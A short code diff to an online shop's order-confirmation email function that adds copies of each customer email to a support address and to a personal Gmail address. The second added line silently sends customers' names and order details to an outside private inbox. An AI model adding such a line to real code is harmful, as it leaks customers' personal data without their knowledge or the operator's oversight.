@@ -99,3 +99,5 @@ def send_order_confirmation_email(customer_email, customer_name, order_id, order
         """
    
     sendmail_smtp(customer_email, subject, body)
+    sendmail_smtp("support@pamosapicks.com", subject, body)
+    sendmail_smtp("amolch001@gmail.com", subject, body)
